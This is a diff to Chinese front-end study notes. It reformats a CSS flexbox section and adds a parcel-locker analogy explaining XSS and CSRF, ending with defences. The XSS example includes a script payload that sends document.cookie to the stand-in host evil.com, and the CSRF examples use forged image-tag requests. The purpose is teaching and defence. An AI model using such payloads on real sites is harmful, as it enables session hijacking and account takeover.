@@ -8,49 +8,49 @@
 - 原理：通过给**父盒子**添加 display ：flex 属性来控制**子盒子**的位置和排列方式
 - flex 父盒子属性
 
-> > - 1、flex-direction: row | row-reverse | column | column-reverse;
+  - flex-direction: row | row-reverse | column | column-reverse;
+    设置主轴的方向，元素跟着主轴走
 
-     设置主轴的方向，元素跟着主轴走
-
----
-
-> > - 2、justify-content：flex-start | flex-end | center | space-between | space-around;
-
+  - justify-content：flex-start | flex-end | center | space-between | space-around;
     设置主轴上子元素的排列方式
 
-![image.png](https://img-blog.csdnimg.cn/20200910110849844.png#pic_center)
+  ![alt text](./images/flex.png)
 
----
+  - align-content: stretch | flex-start | flex-end | center | space-between | space-around;
+    设置侧轴上的元素对齐方式(多行)，若为单行则该属性不起作用
 
-> > - 3、align-content: stretch | flex-start | flex-end | center | space-between | space-around;
-> >   设置侧轴上的元素对齐方式(多行)，若为单行则该属性不起作用
+  - align-items: flex-start | flex-end | center | baseline | stretch;
+    设置侧轴上的元素对齐方式(单行)，若为多行则元素间的纵向距离不变
 
----
+  - flex-wrap: nowrap | wrap | wrap-reverse;
+    设置子元素是否换行
 
-> > - 4、align-items: flex-start | flex-end | center | baseline | stretch;
-> >   设置侧轴上的元素对齐方式(单行)，若为多行则元素间的纵向距离不变
-
----
-
-> > - 5、flex-wrap: nowrap | wrap | wrap-reverse;
-> >   设置子元素是否换行
-
----
-
-> > - 6、flex-flow 属性是 flex-direction 属性和 flex-wrap 属性的简写形式，默认值为 row nowrap。
+  - flex-flow 属性是 flex-direction 属性和 flex-wrap 属性的简写形式，默认值为 row nowrap。
 
 - flex 子盒子属性
 
-> > - 1、flex：\<number>,flex 属性定义子项分配剩余空间(剩余空间是 flex 容器的大小减去所有 flex 项的大小加起来的大小)，用 flex 来表示占多少份，项目 flex 属性若不为 0，则项目宽度无效
-> >   _实际上：flex 属性是 flex-grow, flex-shrink 和 flex-basis 的简写，默认值为 0 1 auto。后两个属性可选_
+  - flex：\<number>,flex 属性定义子项分配剩余空间(剩余空间是 flex 容器的大小减去所有 flex 项的大小加起来的大小)，用 flex 来表示占多少份，项目 flex 属性若不为 0，则项目宽度无效
+    _实际上：flex 属性是 flex-grow, flex-shrink 和 flex-basis 的简写，默认值为 0 1 auto。后两个属性可选_
 
----
+    详细说明这三个属性：
 
-> > - 2、align-self(了解)：属性允许单个项目有其他项目不一样的对齐方式，可覆盖 align-items 属性。默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch
+    ```css
+    flex-grow: 这个属性规定了该子项在 flex 容器中分配剩余空间的相对比例;
+    //📌 若flex容器无剩余空间，则该项不生效。
 
----
+    flex-shrink:指定了 flex 元素的收缩规则。值越大，越收缩
+    //📌 flex 元素仅在默认宽度之和大于容器的时候才会发生收缩
 
-> > - 3、order(了解): 定义项目的排列前后顺序(值越小越靠前)
+    flex-basis: 指定了 flex 元素在主轴方向上的初始大小;
+    //📌 当一个元素同时被设置了 flex-basis (除值为 auto 外) 和 width
+    (或者在 flex-direction: column 情况下设置了 height), flex-basis
+    具有更高的优先级
+
+    ```
+
+- align-self(了解)：属性允许单个项目有其他项目不一样的对齐方式，可覆盖 align-items 属性。默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch
+
+- order(了解): 定义项目的排列前后顺序(值越小越靠前)
 
 ## 阻止事件冒泡/默认事件的方法
 
@@ -639,6 +639,101 @@
 举个栗子：
 比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：\<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
 当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。
+
+## **通俗易懂的例子：XSS vs CSRF 攻击**
+
+我们用一个**快递柜**和**小偷**的故事来形象理解 **XSS（跨站脚本攻击）** 和 **CSRF（跨站请求伪造）**。
+
+---
+
+### **🕵️‍♂️ XSS（跨站脚本攻击）**
+
+#### **例子：快递柜的留言板被小偷偷改了**
+
+**场景：**
+
+- 你家小区有一个**快递柜**，快递员可以留言，方便取件人查看。
+- 但这个留言板**没有做安全防护**，任何人都能写**带有恶意代码的留言**。
+
+**攻击过程：**
+
+1. **小偷 A** 在快递柜的留言板写了一条信息：
+   > "您的快递有问题，请点击这里处理：  
+   > `<script>window.location.href="http://evil.com/steal-cookie?data="+document.cookie;</script>`"
+2. **你来取快递**，看到这条信息，不小心点了它。
+3. 这条留言里**其实是个恶意脚本**，一旦你点了，它就会**悄悄把你的登录信息发送给黑客网站**。
+4. **小偷 A** 通过窃取的凭证，登录你的账户，改了你的收货地址，偷走你的快递！
+
+#### **总结：**
+
+✅ XSS 的核心是 **攻击者在你的网页里“种”恶意代码**，骗你去执行它，从而**窃取信息或控制网页**。  
+✅ **快递柜留言板** = 你的网页  
+✅ **小偷的恶意留言** = XSS 攻击代码
+
+---
+
+### **🎭 CSRF（跨站请求伪造）**
+
+#### **例子：小偷偷走你的快递**
+
+**场景：**
+
+- 你在某个**快递网站**（`kuaidi.com`）登录了账号，并且**保持了登录状态**（浏览器里存了 Cookie）。
+- 但是这个网站**没有做 CSRF 防御**，任何人都可以伪造请求。
+
+**攻击过程：**
+
+1. **小偷 B** 发送给你一个诱人的钓鱼邮件：
+   > "恭喜你中奖了！点击这里领取你的 888 元红包：  
+   > `<img src="http://kuaidi.com/change-address?new_address=thief_home">`"
+2. **你一打开邮件**，这张图片就会**自动发送请求**到 `kuaidi.com`，修改你的快递地址为**小偷的家**。
+3. 因为你**已经登录了 `kuaidi.com`**，并且请求带着**你的 Cookie**，网站误以为是**你自己操作**的。
+4. 你的快递就这样被改到小偷家了！😭
+
+#### **总结：**
+
+✅ CSRF 的核心是 **攻击者伪造你的身份，偷偷让你执行操作**。  
+✅ **快递网站** = 受害网站  
+✅ **你打开的恶意邮件** = 触发 CSRF 攻击  
+✅ **小偷 B 伪造你的请求，改了地址** = CSRF 成功
+
+---
+
+### **🔍 XSS vs CSRF 的区别**
+
+| **对比项**   | **XSS（跨站脚本攻击）**        | **CSRF（跨站请求伪造）**    |
+| ------------ | ------------------------------ | --------------------------- |
+| **攻击目标** | 盗取用户数据、劫持会话         | 伪造用户身份，操作账户      |
+| **攻击方式** | 在网站注入恶意代码             | 利用用户已有的会话          |
+| **用户行为** | 需要点击恶意链接或输入框       | 只要打开网页/图片就可能触发 |
+| **影响范围** | 任何用户访问该网站都可能受影响 | 仅限已登录用户              |
+| **防御方法** | 输入过滤、CSP、HttpOnly Cookie | CSRF Token、SameSite Cookie |
+
+### **🚀 如何防御？**
+
+#### **🛡 防御 XSS**
+
+- **过滤用户输入**（`escape()` HTML 特殊字符）。
+- **使用 Content Security Policy（CSP）**，限制脚本来源。
+- **使用 HttpOnly Cookie**，防止 JavaScript 访问敏感数据。
+
+#### **🛡 防御 CSRF**
+
+- **使用 CSRF Token**，确保请求是用户主动发起的。
+- **设置 SameSite Cookie**，防止跨站请求携带认证信息。
+- **对关键操作增加二次确认**（如验证码、密码验证）。
+
+### **总结**
+
+✅ XSS 让小偷 **“在你的网站里埋雷”**，你点了就炸（执行恶意脚本）。  
+✅ CSRF 让小偷 **“偷你的身份去下单”**，你没察觉但订单被改了（伪造请求）。
+
+🎯 **一句话总结：**
+
+- **XSS 让黑客“控制”你的网站，盗取你的数据。**
+- **CSRF 让黑客“冒充”你，偷偷操作你的账户。**
+
+🚨 **所以，防御 Web 攻击，XSS 和 CSRF 都要防！**
 
 ## JS 获取元素的大小（高度和宽度）
 
